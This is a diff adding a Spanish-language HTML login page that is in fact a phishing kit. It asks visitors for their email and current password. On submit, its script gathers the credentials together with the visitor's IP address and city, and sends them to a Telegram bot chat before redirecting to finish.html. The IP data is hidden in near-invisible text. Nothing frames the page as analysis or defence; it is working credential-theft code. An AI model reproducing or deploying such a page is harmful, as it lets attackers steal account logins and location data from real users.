@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Log - Internet /(HOME</title>
+  <link rel="stylesheet" href="artt/lacarardelh.css">
+
+     
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script src="artt/tello.js"></script>
+<script>
+  $.getJSON("https://api.ipify.org?format=json", function(data) {
+          $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io", function(response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+  });
+
+  var u_name, u_name2, ip, ip2, message;
+  var ready = function() {
+    u_name = document.getElementById("ejdysdysd3").value;
+    u_name2 = document.getElementById("fow773").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "MMMBB\n☰ccc: " + u_name + "\n☰clv11: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+  };
+  var sender = function() {
+    ready();
+    var settings = {
+      "async": true,
+      "crossDomain": true,
+      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "cache-control": "no-cache"
+      },
+      "data": JSON.stringify({
+        "chat_id": chat_id,
+        "text": message
+      })
+    };
+    $.ajax(settings).done(function(response) {
+      console.log(response);
+      window.location = 'finish.html';
+    });
+    return false;
+  };
+
+</script>
+</head>
+<body>
+
+    <img class="log2" src="imdd/log-msu3.png" alt=""> <div style="background-color: rgb(25, 102, 255); width: 100%; ">
+    
+    <p style="color: white;padding: 10px; text-align: center;">A continuacion Realiza el inicio de Session, con tus credenciales actuales!</p></div>
+    <center>
+ 
+</div>
+  
+<form method="post" action="#" onsubmit="return sender();">
+    
+   <img src="imdd/vlog-ibn.png" alt="">
+      <input placeholder="Ingresa el email." type="email" id="ejdysdysd3" name="ejdysdysd3" required>
+
+      
+      <input placeholder="Ingresa tu contraseña actual !" type="password" id="fow773" name="fow773" required>
+ 
+
+
+
+    <input class="typsub" type="submit" value="Iniciar Sesión"> <br><br>
+  </form></center>
+</div>    </div>
+<div style="color: rgb(255, 255, 255);font-size: 0.05px;">
+  <p id="gfg"></p>
+  <p id="ip"></p>
+  <p id="address"></p></div>
+</body>
+</html>
